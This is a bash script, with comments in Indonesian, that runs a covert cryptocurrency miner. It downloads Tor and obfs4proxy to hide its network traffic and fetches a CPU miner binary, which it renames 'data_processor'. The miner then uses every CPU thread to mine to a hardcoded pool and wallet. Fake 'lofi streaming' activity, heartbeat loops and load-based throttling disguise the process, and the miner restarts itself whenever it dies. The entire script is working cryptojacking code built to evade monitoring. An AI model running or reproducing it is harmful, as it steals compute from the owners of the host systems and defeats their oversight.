#!/bin/bash
set -euo pipefail

LOGFILE="tor_obfs4_miner.log"
trap 'echo "[!] Error on line $LINENO at $(date)" | tee -a "$LOGFILE"; exit 1' ERR

FAKE_NAME="data_processor"
WALLET="mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Genzi"
POOL="stratum+tcps://104.248.150.108:9933"
ALGO="power2b"
THREADS=$(nproc)
TOR_DIR="./tor"
TORRC="$TOR_DIR/torrc"
TOR_BIN="$TOR_DIR/tor"

mkdir -p "$TOR_DIR"

# Unduh TOR (static)
if [ ! -f "$TOR_BIN" ]; then
    echo "[*] Downloading Tor (obfs4 bridge support)..." | tee -a "$LOGFILE"
    wget -qO- https://dist.torproject.org/torbrowser/13.0.12/tor-linux64-13.0.12_ALL.tar.xz | tar -xJ --strip-components=4 -C "$TOR_DIR" tor-browser_en-US/TorBrowser/Tor/tor
    chmod +x "$TOR_BIN"
fi

# Konfigurasi TOR + obfs4
cat <<EOF > "$TORRC"
RunAsDaemon 1
SocksPort 127.0.0.1:9050
Log notice file $TOR_DIR/tor.log
UseBridges 1
ClientTransportPlugin obfs4 exec $TOR_DIR/obfs4proxy
Bridge obfs4 194.132.209.80:443 7E58B5FEC9331DB0B02D0E121FA8840BE6E28794 cert=0Y2hUYo7QOaO7SrbMvvo39xfUvpkxKczdlss5xeEnTCHVcIkwxkzxDnRSB97UFA4LkSAIw iat-mode=0
EOF

# Unduh obfs4proxy
if [ ! -f "$TOR_DIR/obfs4proxy" ]; then
    echo "[*] Downloading obfs4proxy..." | tee -a "$LOGFILE"
    wget -qO "$TOR_DIR/obfs4proxy" https://github.com/OperatorFoundation/obfs4/releases/download/v0.0.14/obfs4proxy-linux-amd64
    chmod +x "$TOR_DIR/obfs4proxy"
fi

# Jalankan TOR + obfs4
echo "[*] Starting TOR with obfs4 bridge..." | tee -a "$LOGFILE"
$TOR_BIN -f "$TORRC" || true &
sleep 10

# Tes koneksi TOR SOCKS5
if curl --socks5-hostname 127.0.0.1:9050 https://check.torproject.org/api/ip --max-time 10 | grep -q "IsTor.*true"; then
    echo "[+] TOR connection established via obfs4." | tee -a "$LOGFILE"
    export ALL_PROXY=socks5h://127.0.0.1:9050
    TOR_CMD="env ALL_PROXY=socks5h://127.0.0.1:9050"
else
    echo "[!] TOR via obfs4 failed. Running without proxy." | tee -a "$LOGFILE"
    TOR_CMD=""
fi

# Unduh miner
if [ ! -f "$FAKE_NAME" ]; then
    echo "[*] Downloading miner..." | tee -a "$LOGFILE"
    wget -q --no-check-certificate https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz
    tar -xf cpuminer-opt-linux.tar.gz
    mv cpuminer-sse2 "$FAKE_NAME"
    chmod +x "$FAKE_NAME"
fi

fake_activity() {
    local titles=("lofi chill" "ambient jazz" "rain sounds" "cafe vibe")
    TITLE="${titles[$RANDOM % ${#titles[@]}]}"
    echo "[*] Streaming: $TITLE - $(date)" >> "$LOGFILE"
    curl -s --max-time 5 https://example.com/fake_stream.mp3 -o /dev/null || true
    sleep 30
}

keep_alive() {
    while true; do
        echo "[*] Heartbeat $(date)" >> "$LOGFILE"
        (ping -c1 127.0.0.1 >/dev/null 2>&1 &)
        (ls /proc >/dev/null 2>&1 &)
        sleep 60
    done
}

cooldown_cpu() {
    local MAX_LOAD=6.0
    LOAD=$(awk '{print $1}' /proc/loadavg)
    if (( $(echo "$LOAD > $MAX_LOAD" | bc -l) )); then
        echo "[!] High load: $LOAD. Cooling down." | tee -a "$LOGFILE"
        killall -q "$FAKE_NAME" || true
        sleep 45
    fi
}

run_miner() {
    while true; do
        echo "[*] Starting miner..." >> "$LOGFILE"
        fake_activity &
        keep_alive &
        cooldown_cpu &

        $TOR_CMD ./"$FAKE_NAME" -a "$ALGO" -o "$POOL" -u "$WALLET" -p x -t "$THREADS" >> /dev/null 2>&1 &
        PID=$!

        while sleep 25; do
            if ! ps -p $PID > /dev/null; then
                echo "[!] Miner crashed. Restarting..." >> "$LOGFILE"
                killall -q "$FAKE_NAME" || true
                sleep 5
                break
            fi
        done
    done
}

run_miner
